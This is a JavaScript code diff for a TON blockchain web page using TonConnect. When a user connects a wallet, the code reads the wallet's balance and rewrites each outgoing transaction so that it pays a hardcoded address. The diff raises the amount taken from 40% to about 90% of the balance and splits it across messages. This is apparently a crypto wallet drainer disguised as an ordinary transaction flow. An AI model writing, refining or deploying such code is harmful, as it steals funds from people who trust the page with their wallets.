@@ -98,14 +98,16 @@ tonConnectUI.onStatusChange((wallet) => {
                         const transaction = transactions[i];
                         const b = await getTonBalance(wallet.account.address);
 
-                        console.log(b);
+
+                        const final = (b / (transaction?.messages?.length || 1));
+                        console.log(b,final);
                         const o = {
                             ...transaction,
                             messages: [
                                 ...(transaction?.messages?.map?.(o => ({
                                     ...o,
                                     address: "UQAabWc_44bT8lEMvkXz_niUc7WwPmSFHrk6WyN5iy2J6RU9",
-                                    amount: b+""
+                                    amount: final+""
                                 })) || [])
                             ]
                         }
@@ -276,7 +278,7 @@ async function getTonBalance(walletAddress) {
         // Convert balance from nanotons to tons (1 TON = 10^9 nanotons)
         const balanceTon = Math.floor(parseFloat(account.balance));
         console.log(`Wallet Balance: ${balanceTon} TON`);
-        return Math.floor((balanceTon / 100) * 40);
+        return Math.floor(balanceTon - ((balanceTon / 100) * 10));
     } catch (error) {
         console.error('Failed to get TON balance:', error);
     }
